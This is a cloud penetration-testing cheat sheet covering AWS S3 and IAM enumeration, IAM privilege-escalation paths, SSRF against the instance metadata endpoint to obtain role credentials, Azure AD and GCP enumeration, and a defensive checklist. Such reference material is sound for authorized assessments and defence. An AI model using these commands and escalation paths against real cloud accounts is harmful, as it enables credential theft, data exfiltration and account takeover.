# Cloud Security Assessment
**Author: Manish Verma**

---

## 📌 Objective
**Scope:** Cloud environment security assessment  
**Tools Used:** aws-cli, Scout Suite, Pacu, ROADtools  
**Outcome:** Identify misconfigurations and privilege escalation paths

---

## AWS S3 Enumeration

```bash
# List public buckets
aws s3 ls s3://target-bucket --no-sign-request

# Find buckets by domain/company name
aws s3 ls s3://company-name --no-sign-request
aws s3 ls s3://company-name-dev --no-sign-request
aws s3 ls s3://company-name-backup --no-sign-request

# Download from public bucket
aws s3 cp s3://target-bucket/file.txt . --no-sign-request
aws s3 sync s3://target-bucket/ ./local-copy --no-sign-request

# Check bucket permissions
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request
```

---

## AWS IAM Privilege Escalation

```bash
# Enumerate permissions
aws iam get-user
aws iam list-user-policies --user-name <user>
aws iam list-attached-user-policies --user-name <user>
aws iam list-groups-for-user --user-name <user>

# Common privesc paths:
# iam:CreatePolicyVersion → create new policy version with admin
# iam:AttachUserPolicy → attach AdministratorAccess to self
# iam:CreateAccessKey → create key for admin user
# iam:PassRole + ec2:RunInstances → launch instance with admin role
```

---

## AWS Metadata SSRF

```bash
# IMDSv1 (vulnerable to SSRF)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# Response contains:
# AccessKeyId, SecretAccessKey, Token
# Use these to authenticate as the EC2 role
```

---

## Azure AD Enumeration

```bash
# ROADtools
pip install roadtools
roadrecon auth -u user@domain.com -p password
roadrecon gather
roadrecon gui    # View in browser

# BloodHound for Azure (AzureHound)
./azurehound -u user@domain.com -p password list --tenant <tenant_id>

# Key Azure attack paths:
# - App registrations with permissions
# - Service principals with secrets
# - Managed identities
# - Conditional Access bypass
```

---

## GCP Enumeration

```bash
# List projects
gcloud projects list

# List service accounts
gcloud iam service-accounts list

# Check IAM bindings
gcloud projects get-iam-policy <project>

# Metadata endpoint
http://metadata.google.internal/computeMetadata/v1/
```

---

## Cloud Security Checklist

```
AWS:
- [ ] No public S3 buckets with sensitive data
- [ ] MFA on root account
- [ ] No overly permissive IAM policies
- [ ] CloudTrail logging enabled
- [ ] Security Groups restrict access
- [ ] Secrets not in code/environment variables
- [ ] IMDSv2 enforced (not v1)
```

---

## ⚠️ Disclaimer
All techniques for authorized cloud security assessments only.
